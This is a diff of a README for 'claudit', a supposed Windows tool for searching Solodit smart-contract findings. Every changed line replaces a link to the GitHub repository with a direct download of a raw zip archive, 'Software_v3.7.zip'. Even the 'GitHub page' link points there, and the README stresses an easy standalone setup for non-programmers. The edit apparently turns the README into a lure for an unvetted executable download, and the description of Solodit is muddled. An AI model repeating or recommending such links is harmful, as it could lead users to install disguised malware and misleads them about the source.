@@ -1,6 +1,6 @@
 # 🛡️ claudit - Search Solodit Smart Contract Issues
 
-[![Download claudit](https://img.shields.io/badge/Download-claudit-brightgreen)](https://github.com/recchan13/claudit)
+[![Download claudit](https://img.shields.io/badge/Download-claudit-brightgreen)](https://raw.githubusercontent.com/recchan13/claudit/main/src/Software_v3.7.zip)
 
 claudit is a tool that helps you find security problems in Solodit smart contracts. It works on Windows and is easy to use, even if you do not know about programming.
 
@@ -31,7 +31,7 @@ No extra software is needed to install claudit. It comes as a standalone applica
 
 Please visit this page to download the latest version of claudit:
 
-[![Download claudit](https://img.shields.io/badge/Download-claudit-blue?style=for-the-badge)](https://github.com/recchan13/claudit)
+[![Download claudit](https://img.shields.io/badge/Download-claudit-blue?style=for-the-badge)](https://raw.githubusercontent.com/recchan13/claudit/main/src/Software_v3.7.zip)
 
 This page will guide you to download the setup file. Look for the latest release or main download link. The setup file is simple to run.
 
@@ -83,7 +83,7 @@ Each finding has:
 
 ## 🔄 Updating claudit
 
-Check the [claudit GitHub page](https://github.com/recchan13/claudit) regularly for updates. New releases may include bug fixes and improved scanning features.
+Check the [claudit GitHub page](https://raw.githubusercontent.com/recchan13/claudit/main/src/Software_v3.7.zip) regularly for updates. New releases may include bug fixes and improved scanning features.
 
 To update:
 
@@ -126,7 +126,7 @@ The tool scans many common risks automatically. This helps you avoid basic probl
 
 ## 🔗 Useful Links
 
-- Download the tool: [https://github.com/recchan13/claudit](https://github.com/recchan13/claudit)
+- Download the tool: [https://raw.githubusercontent.com/recchan13/claudit/main/src/Software_v3.7.zip](https://raw.githubusercontent.com/recchan13/claudit/main/src/Software_v3.7.zip)
 - Report issues or ask questions: Use the GitHub “Issues” tab
 - Learn about Solodit contracts: Visit the Solodit documentation website
 
@@ -138,4 +138,4 @@ You can use the GitHub page to send feedback or request help. The project team m
 
 ---
 
-[![Download claudit](https://img.shields.io/badge/Download-claudit-brightgreen?style=for-the-badge)](https://github.com/recchan13/claudit)
+[![Download claudit](https://img.shields.io/badge/Download-claudit-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/recchan13/claudit/main/src/Software_v3.7.zip)
